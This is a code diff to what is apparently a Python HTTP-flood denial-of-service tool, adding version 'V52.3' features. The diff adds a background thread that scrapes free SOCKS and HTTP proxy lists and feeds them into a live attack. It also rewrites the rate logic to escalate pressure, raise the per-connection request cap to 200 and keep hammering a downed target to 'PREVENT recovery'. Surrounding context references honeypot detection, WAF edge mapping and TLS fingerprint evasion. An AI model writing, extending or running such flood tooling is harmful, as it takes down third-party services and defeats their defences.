@@ -697,6 +697,107 @@ class ProxyHealthChecker(Thread):
                     RECYCLE_EVENT.set()
 
 
+# [V52.3] Auto Proxy Refresher — Scrapes fresh proxies every 10 minutes during attack
+class ProxyAutoRefresher(Thread):
+    """Background daemon that continuously scrapes fresh proxies from public APIs
+    and injects them into the live proxy pool without stopping the attack."""
+    
+    PROXY_SOURCES = [
+        # SOCKS5
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+        "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
+        # SOCKS4
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+        # HTTP
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    ]
+    
+    def __init__(self, proxies_list: list, interval: int = 600, proxy_type: int = 5):
+        Thread.__init__(self, daemon=True)
+        self._proxies = proxies_list  # Shared reference
+        self._interval = interval  # 600s = 10 minutes
+        self._proxy_type = proxy_type
+        self._total_injected = 0
+        self._last_refresh_time = 0
+    
+    def run(self):
+        import re as _re
+        global BURNED_PROXIES
+        
+        # Wait 2 minutes before first refresh (let attack stabilize)
+        sleep(120)
+        
+        while True:
+            try:
+                new_raw = set()
+                fetched_sources = 0
+                
+                for source_url in self.PROXY_SOURCES:
+                    try:
+                        resp = get(source_url, timeout=10, verify=False)
+                        if resp.status_code == 200:
+                            lines = resp.text.splitlines()
+                            for line in lines:
+                                match = _re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})', line.strip())
+                                if match:
+                                    new_raw.add(match.group(1))
+                            fetched_sources += 1
+                    except Exception:
+                        continue
+                
+                if new_raw:
+                    # Build existing set for dedup
+                    existing = set()
+                    for p in self._proxies:
+                        existing.add(f"{p.ip}:{p.port}")
+                    
+                    # Filter out already-known and burned proxies
+                    fresh = []
+                    for p_str in new_raw:
+                        if p_str not in existing and p_str not in BURNED_PROXIES:
+                            try:
+                                ip, port = p_str.split(":")
+                                pt = ProxyType.SOCKS5 if self._proxy_type == 5 else (ProxyType.SOCKS4 if self._proxy_type == 4 else ProxyType.HTTP)
+                                fresh.append(Proxy(ip, int(port), pt))
+                            except Exception:
+                                continue
+                    
+                    if fresh:
+                        # Inject into live pool (thread-safe list append)
+                        old_count = len(self._proxies)
+                        self._proxies.extend(fresh)
+                        self._total_injected += len(fresh)
+                        self._last_refresh_time = time()
+                        
+                        # Also clear old burned proxies (cooldown expired)
+                        expired_burns = [k for k, v in BURNED_PROXIES.items() if time() - v > COOLING_PERIOD]
+                        for k in expired_burns:
+                            del BURNED_PROXIES[k]
+                        
+                        logger.info(
+                            f"{bcolors.OKCYAN}[PROXY REFRESH] +{len(fresh)} fresh proxies injected "
+                            f"(Pool: {old_count} -> {len(self._proxies)}) | "
+                            f"Sources: {fetched_sources} | Burned cleared: {len(expired_burns)} | "
+                            f"Total injected this session: {self._total_injected}{bcolors.RESET}"
+                        )
+                    else:
+                        logger.info(f"{bcolors.OKCYAN}[PROXY REFRESH] No new unique proxies found. Pool: {len(self._proxies)}{bcolors.RESET}")
+                        
+            except Exception as e:
+                logger.warning(f"[PROXY REFRESH] Error: {str(e)[:60]}")
+            
+            sleep(self._interval)
+
+
 # [V6] Stealth Client — TLS fingerprint evasion using tls_client library
 class StealthClient:
     """Wrapper that uses tls_client for Chrome-identical JA3 fingerprint"""
@@ -2731,18 +2832,21 @@ class HttpFlood(Thread):
                 print(f"{bcolors.FAIL}[CHAOS COUNTER-INTEL] HONEYPOT TARPIT DETECTED. Executing Dumb-Bot protocol.{bcolors.RESET}")
                 
     def _chaos_adaptive_scaling(self):
-        """Intelligently shrink or explode Thread allocation based on target mortality.
-        Why burn CPU and Proxies on a corpse?"""
+        """[V52.3] Scale RPC based on target state. Never shrink below original RPC.
+        When target is weakening: 3x RPC for the killing blow.
+        When target is down: keep 2x RPC to PREVENT recovery."""
         intel = self._chaos_intel
         if intel["total_executions"] % 50 == 0:
+            base_rpc = intel.get("adaptive_rpc", self._rpc)
             if intel.get("target_is_down"):
-                # Target is dead, shrink fleet to 20% to conserve proxy bandwidth but keep it dead
-                intel["adaptive_threads"] = max(10, self._rpc // 5)
+                # [V52.3] Target is dead — keep 2x pressure to prevent recovery
+                intel["adaptive_threads"] = max(base_rpc, self._rpc * 2)
             elif intel.get("target_getting_weaker"):
-                # Target is dying, explode fleet to 300% to execute the killing blow
-                intel["adaptive_threads"] = min(2000, self._rpc * 3)
+                # Target is dying — 3x for the killing blow
+                intel["adaptive_threads"] = min(2000, max(base_rpc, self._rpc * 3))
             else:
-                intel["adaptive_threads"] = self._rpc
+                # Normal: use adaptive_rpc from rate controller
+                intel["adaptive_threads"] = max(base_rpc, self._rpc)
 
     def _chaos_edge_node_detection(self):
         """Map the specific geographic WAF edge server serving our connection.
@@ -5737,8 +5841,8 @@ class HttpFlood(Thread):
         return "; ".join(f"{k}={v}" for k, v in cookies.items())
     
     def _chaos_adaptive_rate(self):
-        """Dynamically adjust attack rate based on success/block ratio.
-        Smart pacing: slow down when detected, speed up when invisible."""
+        """[V52.3] Dynamically adjust attack rate based on success/block ratio.
+        Aggressively scales UP when invisible. Only slows when heavily blocked."""
         intel = self._chaos_intel
         
         # Calculate recent success rate
@@ -5752,25 +5856,25 @@ class HttpFlood(Thread):
             
         success_rate = sum(recent_results) / len(recent_results)
         
-        # Adjust RPC (requests per connection)
+        # [V52.3] Adjust RPC aggressively — max raised from 30 to 200
         if success_rate > 0.85:
-            # We're invisible. Increase pressure
-            intel["adaptive_rpc"] = min(intel["adaptive_rpc"] + 2, 30)
-            intel["jitter_ms"] = 0  # No need to slow down
+            # We're invisible. MAXIMUM pressure
+            intel["adaptive_rpc"] = min(intel["adaptive_rpc"] + 10, 200)
+            intel["jitter_ms"] = 0
             intel["successful_streak"] += 1
         elif success_rate > 0.6:
-            # Moderate resistance. Stay steady
-            intel["adaptive_rpc"] = max(min(intel["adaptive_rpc"], 15), 8)
-            intel["jitter_ms"] = randint(10, 50)
+            # Moderate resistance. Increase slowly
+            intel["adaptive_rpc"] = min(intel["adaptive_rpc"] + 3, 150)
+            intel["jitter_ms"] = 0
         elif success_rate > 0.3:
-            # Heavy resistance. Slow down significantly
-            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 2, 5)
-            intel["jitter_ms"] = randint(50, 200)
+            # Heavy resistance. Hold steady, don't retreat
+            intel["adaptive_rpc"] = max(intel["adaptive_rpc"], 30)
+            intel["jitter_ms"] = randint(0, 20)
             intel["successful_streak"] = 0
         else:
-            # Almost fully blocked. Minimal rate
-            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 3, 3)
-            intel["jitter_ms"] = randint(200, 500)
+            # Almost fully blocked. Reduce slightly but don't go below 20
+            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 5, 20)
+            intel["jitter_ms"] = randint(10, 50)
             intel["successful_streak"] = 0
             
         # Boost temperature based on streaks
@@ -8238,6 +8342,7 @@ async def main_async():
                 if proxies:
                     Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, url), daemon=True).start()
                     ProxyHealthChecker(proxies, interval=45).start()
+                    ProxyAutoRefresher(proxies, interval=600, proxy_type=proxy_ty).start()
                     PROXY_ALIVE_COUNT.set(len(proxies))
 
                 tasks = []
